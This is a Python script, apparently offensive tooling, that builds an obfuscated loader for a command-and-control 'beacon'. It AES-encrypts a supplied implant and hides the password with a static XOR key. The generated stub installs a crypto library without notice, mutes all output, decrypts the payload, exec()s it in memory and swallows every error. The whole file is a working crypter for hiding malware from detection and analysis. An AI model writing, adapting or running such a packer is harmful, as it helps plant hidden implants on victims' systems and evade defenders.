import argparse
import base64
import os
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

BLOCK_SIZE = 16
SALT_SIZE = 16
KEY_LEN = 32

def pad(data):
    pad_len = BLOCK_SIZE - len(data) % BLOCK_SIZE
    return data + bytes([pad_len] * pad_len)

def encrypt(data, password):
    salt = os.urandom(SALT_SIZE)
    key = PBKDF2(password, salt, dkLen=KEY_LEN)
    iv = os.urandom(BLOCK_SIZE)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(data))
    return base64.b64encode(salt + iv + ciphertext).decode()

def xor_obfuscate(password: str, secret: str) -> bytes:
    key_bytes = secret.encode()
    pw_bytes = password.encode()
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(pw_bytes)])

def format_bytes_literal(data: bytes) -> str:
    return "b'" + ''.join([f'\\x{b:02x}' for b in data]) + "'"

AES_EXECUTOR_TEMPLATE = '''import base64
import os
import sys
import subprocess
import io
import contextlib

@contextlib.contextmanager
def suppress_output():
    with open(os.devnull, 'w') as fnull:
        original_stdout = sys.stdout
        original_stderr = sys.stderr
        sys.stdout = fnull
        sys.stderr = fnull
        try:
            yield
        finally:
            sys.stdout = original_stdout
            sys.stderr = original_stderr

try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
except ImportError:
    with suppress_output():
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2

keygen_secret = "{keygen_secret}"
obfuscated_password_bytes = {obfuscated_password_bytes}
encrypted_data = \"\"\"{encrypted_data}\"\"\"

def deobfuscate_password(secret: str, obf_bytes: bytes) -> str:
    secret_bytes = secret.encode()
    password_bytes = bytes([b ^ secret_bytes[i % len(secret_bytes)] for i, b in enumerate(obf_bytes)])
    return password_bytes.decode()

BLOCK_SIZE = 16
SALT_SIZE = 16
KEY_LEN = 32

def unpad(data):
    return data[:-data[-1]]

def decrypt(enc_data, password):
    raw = base64.b64decode(enc_data)
    salt = raw[:SALT_SIZE]
    iv = raw[SALT_SIZE:SALT_SIZE+BLOCK_SIZE]
    ciphertext = raw[SALT_SIZE+BLOCK_SIZE:]
    key = PBKDF2(password, salt, dkLen=KEY_LEN)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ciphertext))

try:
    password = deobfuscate_password(keygen_secret, obfuscated_password_bytes)
    decrypted_code = decrypt(encrypted_data, password).decode()
    with suppress_output():
        exec(decrypted_code, globals())
except Exception:
    pass
'''

def main():
    parser = argparse.ArgumentParser(description="AES-encrypted Python Beacon Builder")
    parser.add_argument("beacon", help="Path to Python beacon script")
    parser.add_argument("-p", "--password", required=True, help="Password used for AES encryption")
    parser.add_argument("-k", "--keygen-secret", default="janbskj", help="Static key to XOR-obfuscate the password")
    parser.add_argument("-o", "--output", default="build/beacon/aes_beacon.py", help="Output stub file")

    args = parser.parse_args()

    with open(args.beacon, 'rb') as f:
        beacon_code = f.read()

    encrypted_data = encrypt(beacon_code, args.password)
    obfuscated = xor_obfuscate(args.password, args.keygen_secret)
    obfuscated_literal = format_bytes_literal(obfuscated)

    stub = AES_EXECUTOR_TEMPLATE.format(
        keygen_secret=args.keygen_secret,
        obfuscated_password_bytes=obfuscated_literal,
        encrypted_data=encrypted_data
    )

    with open(args.output, 'w') as out_file:
        out_file.write(stub)

    print(f"[+] AES-encrypted beacon stub written to: {args.output}")

if __name__ == "__main__":
    main()

